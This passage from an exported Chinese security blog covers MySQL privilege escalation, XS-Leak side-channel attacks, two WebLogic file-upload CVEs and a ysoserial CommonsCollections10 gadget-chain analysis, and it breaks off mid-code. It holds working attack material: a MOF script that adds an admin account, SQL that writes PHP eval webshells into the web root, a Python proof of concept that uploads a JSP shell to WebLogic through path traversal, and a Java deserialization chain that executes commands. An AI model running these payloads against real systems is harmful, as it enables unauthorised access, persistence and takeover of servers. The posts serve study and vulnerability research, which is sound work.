class="line">Name &#x3D; &quot;consPCSV2&quot;;</span><br><span class="line">ScriptingEngine &#x3D; &quot;JScript&quot;;</span><br><span class="line">ScriptText &#x3D;</span><br><span class="line">&quot;var WSH &#x3D; new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user admin admin &#x2F;add\&quot;)&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer   &#x3D; $Consumer;</span><br><span class="line">Filter &#x3D; $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>mof文件中加入待执行的命令。</p>
<ul>
<li>写入mof文件</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select unhex(&#39;&#39;) into dumpfile &quot;C:\\WINDOWS\\SYSTEM32\\wbem\\mof\\nullevt.mof&quot;</span><br></pre></td></tr></table></figure>

<h3 id="工具利用-1"><a href="#工具利用-1" class="headerlink" title="工具利用"></a>工具利用</h3><h2 id="webshell提权"><a href="#webshell提权" class="headerlink" title="webshell提权"></a>webshell提权</h2><p>webshell提权方式利用的是向web目录中写入shell文件，从而提权。</p>
<h3 id="提权流程"><a href="#提权流程" class="headerlink" title="提权流程"></a>提权流程</h3><ul>
<li>当mysql具有web目录写权限时。</li>
</ul>
<p><code>SELECT &#39;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&#39; into outfile &#39;/var/www/html/1.php&#39;;</code></p>
<ul>
<li>当mysql不具有写权限时，但可以设置日志位置。</li>
</ul>
<pre><code>set global general_log=&quot;ON&quot;;
set global general_log=&quot;/var/www/html/1.php&quot;;
select &quot;&lt;?php eval($_GET[&apos;post&apos;]);?&gt;;&quot;</code></pre><h1 id="0x03-客户端攻击"><a href="#0x03-客户端攻击" class="headerlink" title="0x03 客户端攻击"></a>0x03 客户端攻击</h1><h2 id="mysql客户端任意文件读取"><a href="#mysql客户端任意文件读取" class="headerlink" title="mysql客户端任意文件读取"></a>mysql客户端任意文件读取</h2><p>此攻击方式利用的是<code>LOAD DATA LOCAL INFILE</code>语句从客户端读取本地文件，存入服务器的table中这一特性。通过伪造mysql服务器，即可任意读取客户端本地的文件。</p>
<ul>
<li><code>load data infile</code>以及非local加载语句都会收到secure_file_priv的限制</li>
<li>且客户端读取的文件并不是客户端指定，而是发送到服务端，服务端指定的。</li>
<li>服务端可以在任何查询语句后恢复文件传输请求</li>
</ul>
<h3 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h3><ul>
<li><p>伪造Mysql服务器 <a href="https://github.com/allyshka/Rogue-MySql-Server" target="_blank" rel="noopener">Rogue-MySql-Server</a></p>
</li>
<li><p>等待客户端发送</p>
</li>
</ul>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="http://www.oniont.cn/index.php/archives/310.html" target="_blank" rel="noopener">MYSQL提权–UDF提权</a></li>
<li><a href="https://misakikata.github.io/2020/01/MySQL%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" target="_blank" rel="noopener">MySQL客户端任意文件读取</a></li>
<li><a href="https://www.anquanke.com/post/id/170626" target="_blank" rel="noopener">一篇文章带你深入理解 SQL 盲注</a></li>
<li><a href="https://yang1k.github.io/post/sql%E6%B3%A8%E5%85%A5%E4%B9%8Border-by%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">sql注入之order by注入</a></li>
<li><a href="https://xz.aliyun.com/t/2288#toc-0" target="_blank" rel="noopener">mysql 延时注入新思路</a></li>
<li><a href="https://xz.aliyun.com/t/2869#toc-9" target="_blank" rel="noopener">SQL 注入总结</a></li>
<li><a href="https://www.smi1e.top/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">Sql注入笔记</a></li>
</ul>
]]></content>
      <tags>
        <tag>MYSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>xs-leak(Cross Site Leak)攻击</title>
    <url>/2020/07/18/xs-leak/</url>
    <content><![CDATA[<p>XS-Leak攻击本质上是一个浏览器侧信道攻击，可被用来推断并收集用户信息。很早这种利用方式就出现了。11年前，即2009年，Chris Evans利用恶意网站，构造不同的关键词搜索访问者电子邮件收件箱的内容。根据返回的时间判断该关键字是否存在，时间长则说明存在该关键词，反之依然。它存在的问题是影响时间的因素很多，准确度难以保证。在6年后，Nethanel Gelernter和Amir Herzberg将其命名为XSSearch，利用统计学的方法使结果更加可靠。而现在又出现的是利用缓存技术来判断查询的结果，它被叫做<font color=#008000>HTTP缓存跨站点泄漏</font>。</p>
<a id="more"></a>

<h1 id="0x01-基于时间的判断方式"><a href="#0x01-基于时间的判断方式" class="headerlink" title="0x01 基于时间的判断方式"></a>0x01 基于时间的判断方式</h1><p>基于时间的xs-leak在测量时间差时，在请求资源的前后分别记录下时间。然后时间差作为判断的依据。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let before &#x3D; performance.now()</span><br><span class="line">await fetch(&quot;&#x2F;&#x2F;mail.com&#x2F;search?q&#x3D;foo&quot;)</span><br><span class="line">let request_time &#x3D; performance.now() - before</span><br></pre></td></tr></table></figure>



<h1 id="0x02-XSSearch方式"><a href="#0x02-XSSearch方式" class="headerlink" title="0x02 XSSearch方式"></a>0x02 XSSearch方式</h1><h2 id="1-Chrome-Xss-Auditor"><a href="#1-Chrome-Xss-Auditor" class="headerlink" title="1.Chrome Xss Auditor"></a>1.Chrome Xss Auditor</h2><p>这里利用了一个特性，即在chrome中通过iframe打开一个页面，当被正确加载时修改window.hash不会出发iframe的onload事件；但是当页面加载错误时，修改iframe的hash会再一次触发onload事件。  </p>
<p>得出了以下逻辑:<br>页面加载成功: 与页面内容不匹配<br>页面加载失败: 与页面内容匹配  </p>
<p>匹配出页面中含有的内容</p>
<blockquote>
<p>chrome中的XSS auditor本身的逻辑比较简单，判断是否输入敏感payload，输入内容是否在页面中含有。</p>
</blockquote>
<h2 id="2-CSS"><a href="#2-CSS" class="headerlink" title="2.CSS"></a>2.CSS</h2><p>CSS的这种利用方式也可以用在绕过CSP上。主要用到的是<font color=#008000>CSS选择器</font>，通过CSS选择器可以对指定的属性加载不同的样式。通过这种方式就能够爆破出属性值。一般可以用来获取CSRF Token、CSP nonce值等。</p>
<p><img src="5.png" alt=""></p>
<p>当input标签的value值以1开头时，向<a href="http://vps/1发送请求，以2开头，向http://vps/2发送请求。根据VPS收到的请求就能获取value值。" target="_blank" rel="noopener">http://vps/1发送请求，以2开头，向http://vps/2发送请求。根据VPS收到的请求就能获取value值。</a></p>
<blockquote>
<p>案例: SECCON2018中有道题目就是利用这样的方式获取csrf token。</p>
</blockquote>
<h2 id="3-window-frames-length"><a href="#3-window-frames-length" class="headerlink" title="3.window.frames.length"></a>3.window.frames.length</h2><p>window.frames.length表示一个页面包含的frames的数量。</p>
<p>案例: Facebook CTF 2019: Secret_note_keeper.<br>这道题目中的web应用的目的是存储、查看、搜索notes。用户可以登录、创建、查看、搜索自己的notes，并提交bug报告。一个notes包含一个title和body，用户通过提供字符串来在body中搜索notes。如果所搜匹配到，则会将结果展示在iFrame中。<br>提交bug报告是提交一个link，然后后台的bot会自动点击。这就可以利用后台的身份，让后台去搜索自己的notes，利用xs-leak获取flag信息。  </p>
<p>构造一个特殊页面(页面内容如下)，放在自己的VPS上，然后将地址提交给后台。</p>
<p><img src="4.png" alt=""></p>
<p>这段payload也很好理解，通过爆破的方式一位一位地开始搜索以<code>fb{</code>开头的字符串，当匹配成功时结果会放在iframe中，通过判断frames的数量即可判断是否匹配成功，还要记得将结果发送回去。</p>
<h2 id="4-history-length"><a href="#4-history-length" class="headerlink" title="4.history.length"></a>4.history.length</h2><p>它的原理和window.frames.length一样，通过判断资源加载前后的history.length有没有增加来判断是否成功加载资源。整个的代码可以写成这样。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let a &#x3D; history.length;</span><br><span class="line">ifr &#x3D; document.createElement(&#39;iframe&#39;);</span><br><span class="line">ifr.src &#x3D; &quot;http:&#x2F;&#x2F;xxxx&#x2F;&quot;;</span><br><span class="line">document.body.appendChild(ifr);</span><br><span class="line">let b &#x3D; history.length - a;</span><br><span class="line"></span><br><span class="line">if (b)&#123;</span><br><span class="line">	console.log(&quot;Resource had been loaded&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	console.log(&quot;Resouce is not loaded&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h1 id="0x03-HTTP缓存跨站点泄漏方式"><a href="#0x03-HTTP缓存跨站点泄漏方式" class="headerlink" title="0x03 HTTP缓存跨站点泄漏方式"></a>0x03 HTTP缓存跨站点泄漏方式</h1><p>HTTP缓存跨站点泄漏攻击实施起来分为3个步骤:</p>
<ul>
<li>删除目标浏览器中特定的缓存</li>
<li>打开目标浏览器查询相关内容</li>
<li>检查浏览器是否缓存了相关内容</li>
</ul>
<p>在上面的整个过程中，攻击者需要满足以下能力:</p>
<ul>
<li>能够删除用户浏览器中的特定缓存。</li>
<li>能够使得用户发起对特定资源的请求。</li>
<li>检查浏览器是否缓存了特定资源</li>
</ul>
<p><strong>删除缓存</strong><br>删除缓存的方式有这几种方式:</p>
<ul>
<li>发送post请求<ul>
<li>发送post请求清空缓存的原理是，当该静态资源以post请求当时被请求时，缓存会认为它不是个静态资源，不应该被缓存，因而清空。</li>
</ul>
</li>
<li>使用fetch “reload”以在服务器上返回错误的方式<ul>
<li>发送fetch请求时将cache设置为reload，当发生错误时(例如设计超长的HTTP referer)会使得reload的cache为空，从而清空。</li>
</ul>
</li>
<li>设计过长的url，使得服务器报错清空之前的缓存。<ul>
<li>当请求静态资源时在后面添加上无用参数，使得达到长度限制，使得服务器报错，浏览器接收到服务器报错后，会清空该静态资源。</li>
</ul>
</li>
</ul>
<p><strong>发起请求</strong><br>要让受害者以特定的方式发送请求，在xs-leak的场景中是使得受害者访问攻击者精心设计的网站，这会使得受害者访问特定资源，发送特定的请求。</p>
<p><strong>检查浏览器是否缓存资源</strong><br>不同的场景有不同的利用方式，在后面会结合案例来说明这种方式。</p>
<h2 id="1-cache-with-referrer"><a href="#1-cache-with-referrer" class="headerlink" title="1.cache with referrer"></a>1.cache with referrer</h2><p>使用referrer的缓存判断，整个demo代码可从github上获取。这种判断不是根据时间响应来判断，来看看它的工作原理吧。</p>
<p><img src="1.png" alt=""></p>
<p>第一段是利用fetch请求的方式，设置过长的referrer来清空缓存。第二段的内容是打开iframe页面，加载img.jpg资源。然后第三段同样设置了过长的referrer，保证了img.jpg的加载只能从缓存中加载。在加载img.jpg时首先会从缓存中寻找，若没有则请求服务器，但此时由于请求的referrer过长报错，导致服务器不会回应正常的资源。</p>
<blockquote>
<p>同时注释中提到了使用<code>cache:force-cache</code>来提高准确率，这是防止缓存过期影响判断。该字段表示fetch请求不顾一切的依赖缓存, 即使缓存过期了, 它依然从缓存中读取. 除非没有任何缓存, 那么它将发送一个正常的request。</p>
</blockquote>
<h1 id="0x04其他"><a href="#0x04其他" class="headerlink" title="0x04其他"></a>0x04其他</h1><p>在xsleaks的github上还有其他的一些利用，由于并未想出来它有什么影响，暂且归为其他。</p>
<ul>
<li>检测content-type类型(仅在火狐中有效，因为<code>typeMustMatch</code>仅在火狐中支持)。</li>
</ul>
<p><img src="3.png" alt=""></p>
<p>根据MDN的解释，HTMLObjectElement.typeMustMatch表示只有链接的资源必须与type相匹配该资源才会被使用。很显然，在这整个过程中，资源会被加载一次。通过这个来判断被请求的资源的content-type。(虽然不知道获取该信息有啥用)</p>
<ul>
<li>检测资源是否可以被iframe嵌入。(仅在Chrome有效）</li>
</ul>
<p><img src="6.png" alt=""></p>
<p>通过判断资源是否被嵌入来得出该资源能否被嵌入的结果。</p>
<ul>
<li>通过是否有下载提示窗口来判断哪些url端点是可以下载文件。</li>
<li>检测跨域服务端重定向</li>
</ul>
<h1 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h1><ul>
<li>社交网络中获取受害者社交网络的用户名，以确定受害者在社交网络中的身份。</li>
<li>获取用户的toke、身份证号码之类的敏感信息。</li>
</ul>
<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><ul>
<li>禁用HTTP缓存(不太可能)</li>
<li>在所有内容上加上CSRF tokens</li>
<li>使用Same Site=strict cookie对用户进行身份验证。</li>
<li>正确配置X-Frame-Options头部，仅允许信任的站点打开站点的iframe。</li>
<li>xs-leak攻击需要频繁地打开页面，请求资源，在一定频率时弹出验证码。</li>
</ul>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://github.com/xsleaks/xsleaks/wiki/Links" target="_blank" rel="noopener">xsleaks</a></li>
<li><a href="https://github.com/xsleaks/xsleaks" target="_blank" rel="noopener">xsleaks</a></li>
<li><a href="https://blog.csdn.net/Sunny_Ducky/article/details/106636236" target="_blank" rel="noopener">【翻译】XS-Leaks攻击简介</a></li>
<li><a href="https://www.anquanke.com/post/id/176049" target="_blank" rel="noopener">XSLeaks 攻击分析 —— HTTP缓存跨站点泄漏</a></li>
<li><a href="https://blog.pspaul.de/posts/facebook-ctf-2019-secret-note-keeper/" target="_blank" rel="noopener">Facebook CTF 2019: Secret Note Keeper (Web 676)</a></li>
<li><a href="https://xz.aliyun.com/t/6698#toc-6" target="_blank" rel="noopener">Cross-Site Search</a></li>
</ul>
]]></content>
      <tags>
        <tag>xs-leak</tag>
      </tags>
  </entry>
  <entry>
    <title>weblogic文件上传漏洞总结</title>
    <url>/2020/06/14/weblogic-upload/</url>
    <content><![CDATA[<p>WebLogic除了著名的T3反序列化漏洞、XMLDecoder反序列化漏洞以及XXE漏洞外，在其历史上也存在文件操作相关漏洞。</p>
<a id="more"></a>

<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>与文件上传漏洞相关的CVE有:</p>
<ul>
<li>CVE-2018-2894</li>
<li>CVE-2019-2618</li>
</ul>
<blockquote>
<p>其中后面出现的CVE-2019-2618利用起来相对严苛，因为它需要认证授权。</p>
</blockquote>
<p>文件上传的几个目录:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;com.oracle.webservices.wls.ws-testclient-app-wls_12.1.3&#x2F;cmprq0&#x2F;war&#x2F;</span><br><span class="line"></span><br><span class="line">&#x2F;ws_utc&#x2F;config&#x2F;keystore&#x2F;timestamp_filename.jsp</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;bea_wls_internal&#x2F;9j4dqk&#x2F;war&#x2F;</span><br><span class="line"></span><br><span class="line">&#x2F;bea_wls_internal&#x2F;shell.jsp</span><br><span class="line"></span><br><span class="line">&#x2F;bea_wls_internal&#x2F;upload&#x2F;RS_Upload_2020-06-16_12-20-21_667&#x2F;import_file_name_cmd.jsp</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;bea_wls_deployment_internal&#x2F;gyuitk&#x2F;war</span><br><span class="line"></span><br><span class="line">&#x2F;bea_wls_deployment_internal&#x2F;cmd.jsp</span><br></pre></td></tr></table></figure>





<h2 id="CVE-2018-2894"><a href="#CVE-2018-2894" class="headerlink" title="CVE-2018-2894"></a>CVE-2018-2894</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>该漏洞产生的原因是<font color=#008000>WebLogic管理端未授权 的两个页面存在任意文件上传漏洞</font>，分别是<font color=#008000>/ws_utc/begin.do</font>和<font color=#008000>/ws_utc/config.do</font>。上传webshell，能够getshell，直接获取权限。</p>
<p>受影响的版本:  </p>
<ul>
<li>12.1.3.0</li>
<li>12.2.1.2</li>
<li>12.2.1.3  </li>
</ul>
<blockquote>
<p>在10.3.6.0版本上并未发现Web服务测试页(Web Test Page)。</p>
</blockquote>
<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>首先需要登录后台，在<code>base_domain</code>的<code>配置</code>中选择<code>高级</code>，最后勾选<code>启用Web服务测试页</code>。本次复现的环境是12.1.3.0。<br><img src="1.png" alt=""></p>
<h4 id="config-do页面上传漏洞"><a href="#config-do页面上传漏洞" class="headerlink" title="config.do页面上传漏洞"></a>config.do页面上传漏洞</h4><p>将当前的工作目录切换到<code>/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls_12.1.3/cmprq0/war/</code>。</p>
<p>访问<code>/ws_utc/config.do</code>。点击左侧的”安全”菜单，添加体格Keystore，设置名字、密码。上传一个任意格式的文件。如下图所示:</p>
<p><img src="5.png" alt=""></p>
<p>然后抓包，查看响应中的timestamp的值，该值会作为后续的文件名中的一部分。</p>
<p><img src="6.png" alt=""></p>
<p>上传成功后，在浏览器中打开jsp文件。jsp文件在<code>/ws_utc/config/keystore/timestamp_cmd.jsp</code></p>
<p><img src="7.png" alt=""></p>
<p>如此，成功getshell。  </p>
<h4 id="begin-do页面上传漏洞"><a href="#begin-do页面上传漏洞" class="headerlink" title="begin.do页面上传漏洞"></a>begin.do页面上传漏洞</h4><p>讲工作目录切换到<code>/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war</code>。</p>
<p><img src="2.png" alt=""></p>
<p>然后打开<code>/ws_utc/begin.do</code>页面。点击右上角的文件夹，上传shell文件。</p>
<p><img src="3.png" alt=""></p>
<p>抓包分析一下，定位到几个关键。</p>
<p><img src="8.png" alt=""></p>
<p>这里的name值import_file_name会变成最后的值。</p>
<p>那么上传之后的路径在哪儿呢？这就比config.do页面的上传路径更复杂些了。  </p>
<p>上传shell之后，虽然响应是500。但文件已经上传成功。  </p>
<p>然后在浏览器中打开，路径为<code>/bea_wls_internal/upload/RS_Upload_2020-06-16_12-20-21_667/import_file_name_cmd.jsp</code>。结果如下所示，也能getshell。</p>
<p><img src="11.png" alt=""></p>
<h3 id="漏洞简要分析"><a href="#漏洞简要分析" class="headerlink" title="漏洞简要分析"></a>漏洞简要分析</h3><h4 id="上传目录更改"><a href="#上传目录更改" class="headerlink" title="上传目录更改"></a>上传目录更改</h4><p>定位到<code>TestClientWorkDirManager#changeWorkDir()</code>方法。</p>
<p><img src="12.png" alt=""></p>
<p>当改变工作目录时，对传入的值未做任何的检测，导致可以更改任意上传目录。</p>
<h4 id="begin-do文件上传"><a href="#begin-do文件上传" class="headerlink" title="begin.do文件上传"></a>begin.do文件上传</h4><p>定位到RSDataHelper#convertFromMultiPart方法。</p>
<p><img src="9.png" alt=""></p>
<p>首先会判断是否存在upload目录，若不存在，则创建。并且将该目录下的所有文件清空。然后将当前的格式化后日期拼接在<code>RS_Upload_</code>后面作为upload目录下的目录名。</p>
<p>继续跟进进入convertFormDataMultiPart()方法。</p>
<p><img src="10.png" alt=""></p>
<p>在该函数里，它会从请求参数中，获得请求参数的key，将其作为文件名的前缀，即import_file_name拼接上传的文件名，作为最终的文件名。</p>
<h4 id="config-do文件上传"><a href="#config-do文件上传" class="headerlink" title="config.do文件上传"></a>config.do文件上传</h4><p>定位到SettingResource#editKeyStoreSettingByMultiPart方法。<br><img src="13.png" alt=""></p>
<p>然后跟进convertFormDataMultiPart()方法，进入到了RSDataHelper#convertFormDataMultiPart()方法。这就到了和begin.do一样的地方了。只不过key的值不一样。即前缀不一样。</p>
<h2 id="CVE-2019-2618"><a href="#CVE-2019-2618" class="headerlink" title="CVE-2019-2618"></a>CVE-2019-2618</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>该漏洞利用条件比较严苛，需要认证。漏洞存在于WebLogic组件中的DeploymentService接口。DeploymentService接口的正常功能就是部署war包。攻击者，设置wl_request_type参数为app_upload，构造文件上传格式的POST请求包，上传jsp木马文件，进而获取服务器权限。</p>
<p>影响版本:</p>
<ul>
<li>10.3.6.0</li>
<li>12.1.3.0</li>
<li>12.2.1.3</li>
</ul>
<blockquote>
<p>在12.1.3.0中，”wls_upload_application_name”中的值不能包含../。因此会失败。</p>
</blockquote>
<h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p>向路径<code>/bea_wls_deployment_internal/DeploymentService</code>发送POST数据包。</p>
<p>利用python脚本来实现。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1:7001&#x2F;bea_wls_deployment_internal&#x2F;DeploymentService&quot;</span><br><span class="line"></span><br><span class="line">header &#x3D; &#123;</span><br><span class="line">	&quot;username&quot;:&quot;weblogic&quot;,</span><br><span class="line">	&quot;wl_request_type&quot;:&quot;app_upload&quot;,</span><br><span class="line">	&quot;cache-control&quot;:&quot;no-cache&quot;,</span><br><span class="line">	&quot;wl_upload_application_name&quot;:&quot;..&#x2F;tmp&#x2F;_WL_internal&#x2F;bea_wls_deployment_internal&#x2F;gyuitk&#x2F;war&quot;,</span><br><span class="line">	&quot;serverName&quot;:&quot;xxxxx&quot;,</span><br><span class="line">	&quot;password&quot;:&quot;xxxxx&quot;,</span><br><span class="line">	&quot;wl_upload_delta&quot;:&quot;true&quot;,</span><br><span class="line">	&quot;server_version&quot;:&quot;12.1.3.0&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">files &#x3D; &#123;&#39;file&#39;:open(&#39;cmd.jsp&#39;,&#39;rb&#39;)&#125;</span><br><span class="line">res &#x3D; requests.post(url,files&#x3D;files,headers&#x3D;header)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>

<p>然后在路径<code>/bea_wls_deployment_internal/cmd.jsp</code>中访问shell。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://www.freebuf.com/vuls/178510.html" target="_blank" rel="noopener">WebLogic两处任意文件上传漏洞动态分析（CVE-2018-2894）</a></li>
<li><a href="https://chybeta.github.io/2018/07/21/WebLogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-2894-%E3%80%91/" target="_blank" rel="noopener">WebLogic任意文件上传漏洞复现与分析 -【CVE-2018-2894 】</a></li>
<li><a href="https://www.freebuf.com/column/205469.html" target="_blank" rel="noopener">CVE-2018-2894漏洞分析</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>WebLogic</tag>
      </tags>
  </entry>
  <entry>
    <title>ysoserial分析之CommonsCollecions10</title>
    <url>/2020/04/28/ysoserial-analyze-10/</url>
    <content><![CDATA[<p>这篇文章分析的是CommonsCollections10，这是<a href="https://github.com/wh1t3p1g" target="_blank" rel="noopener">wh1t3p1g</a>师傅提出来的，这篇文章分析分析它用到了哪个新的点。</p>
<a id="more"></a>

<p>前面已经分析了:<br><a href="https://ananaskr.github.io/2020/04/20/ysoserial-analyze/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections1</a><br><a href="https://ananaskr.github.io/2020/04/24/ysoserial-analyze-2/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections2</a><br><a href="https://ananaskr.github.io/2020/04/23/ysoserial-analyze-3/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections3</a><br><a href="https://ananaskr.github.io/2020/04/26/ysoserial-analyze-4/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections4</a><br><a href="https://ananaskr.github.io/2020/04/26/ysoserial-analyze-5/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections5</a><br><a href="https://ananaskr.github.io/2020/04/27/ysoserial-analyze-6/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections6</a><br><a href="https://ananaskr.github.io/2020/04/27/ysoserial-analyze-7/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections7</a><br><a href="https://ananaskr.github.io/2020/04/28/ysoserial-analyze-8/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections8</a><br><a href="https://ananaskr.github.io/2020/04/28/ysoserial-analyze-9/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections9</a></p>
<p>wh1t3p1g师傅提出的CommonsCollections10主要是结合了CommonsCollection6，7。在Hashtable的reconstitutionPut函数中找到利用hashcode方法来触发TiedMapEntry.getValue方法，从而触发LazyMap.get方法的点。整个反序列链如下所示:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hashtable.readObject()</span><br><span class="line">  -&gt;Hashtable.reconstitutionPut()</span><br><span class="line">    -&gt;TiedMapEntry.hashCode()</span><br><span class="line">      -&gt;TiedMapEntry.getValue()</span><br><span class="line">        -&gt;LazyMap.get()</span><br><span class="line">          -&gt;ChainedTransformer.transform()</span><br><span class="line">            -&gt;InvokerTransformer.transform()</span><br></pre></td></tr></table></figure>

<h2 id="利用链分析及构造"><a href="#利用链分析及构造" class="headerlink" title="利用链分析及构造"></a>利用链分析及构造</h2><p>最外层还是还是使用Hashtable触发了readObject函数，接着进入reconstitutionPut函数，看看这个函数。</p>
<p><img src="1.png" alt=""></p>
<p>可以看到了调用了hashCode()函数。而在前面提到过，TiedMapEntry类的触发getValue函数有toString、hashCode以及equals。这里是hashCode。所以，这里的key是TiedMapEntry对象。首先是构造TiedMapEntry对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">               <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">               new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",new Class[0]&#125;),</span><br><span class="line">               new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">               new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line"></span><br><span class="line">       &#125;;</span><br><span class="line"></span><br><span class="line">       ChainedTransformer transformer  = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">       Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">       Map lazyMap = LazyMap.decorate(map,transformer);</span><br><span class="line"></span><br><span class="line">       TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazyMap,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>然后实例化一个Hashtable，放入元素后，获取Hashtable的table属性，然后获取table中的Entry的key属性，将key属性设置为TiedMapEntry对象即可。代码如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Hashtable hashtable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">hashtable.put(<span class="string">"foo"</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">Field field = hashtable.getClass().getDeclaredField(<span class="string">"table"</span>);</span><br><span class="line">field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">Object[] table = (Object[]) field.get(hashtable);</span><br><span class="line">Object entry = table[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span> (entry==<span class="keyword">null</span>)&#123;</span><br><span class="line">       entry = table[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Field keyfield = entry.getClass().getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">keyfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">keyfield.set(entry,tiedMapEntry);</span><br></pre></td></tr></table></figure>

<p>完整的demo如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> 